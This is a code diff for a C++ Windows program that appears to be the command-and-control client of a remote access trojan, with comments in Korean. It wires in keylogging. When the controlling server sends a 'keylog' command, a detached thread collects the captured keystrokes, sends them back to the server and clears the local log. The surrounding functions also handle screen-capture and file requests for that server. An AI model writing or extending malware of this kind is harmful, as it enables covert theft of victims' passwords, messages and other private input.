@@ -10,6 +10,7 @@
 #include <mutex>
 #include "cncManager.h"
 #include "commandManager.h"
+#include "keyLogger.h"
 
 cncManager::cncManager() {
 }
@@ -225,7 +226,8 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                     }
                     /* 키로그 처리 */
                     else if (!data.compare("keylog")) {
-                        // TODO send keylog
+                        std::thread keyLogHandler = std::thread(&cncManager::handleKeyLog, this);
+                        keyLogHandler.detach();
                     }
                     /* 파일 요청 처리 */
                     else {
@@ -289,4 +291,12 @@ void cncManager::handleScreenRequest() {
     this->sendData(ftpResponse, commander.screen_len, ptr);
     delete[] ptr;
     
+}
+
+// 키로그 전송
+void cncManager::handleKeyLog() {
+    keyLogger logger;
+    std::string log = logger.getKeyLog();
+    this->sendData(ftpResponse, log.length(), (LPVOID)log.c_str());
+    logger.clearLog();
 }
